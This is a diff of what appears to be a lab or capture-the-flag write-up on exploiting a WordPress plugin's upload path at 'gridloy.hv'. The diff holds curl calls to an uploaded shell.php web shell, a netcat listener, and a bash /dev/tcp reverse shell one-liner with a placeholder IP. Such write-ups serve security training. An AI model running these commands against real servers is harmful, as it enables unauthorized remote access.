@@ -132,25 +132,7 @@ curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
 ```
 <img width="822" height="190" alt="cevap 3" src="https://github.com/user-attachments/assets/236351b7-a5f8-4ee5-81f5-4813bf5f904a" />
 
-### 4.3 Web Shell Verification (RCE Confirmation)
-
-To confirm that Remote Code Execution (RCE) was successfully achieved, I manually executed the test command:
-
-```bash
-curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
-```
-
-The server responded with the following output:
-
-```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-This output confirms that arbitrary system commands can be executed on the target server as the **www-data** user, proving a successful **unauthenticated Remote Code Execution (RCE)**.
-
-📸 **Screenshot:** RCE confirmation using the `id` command
-
-### 6.1 Listener Setup
+### Listener
 
 ```bash
 nc -lvnp 4444
@@ -159,7 +141,7 @@ nc -lvnp 4444
 ### 6.2 Reverse Shell Trigger
 
 ```bash
-curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"
 ```
 
 📸 **Screenshot 6:** Reverse shell as `www-data`
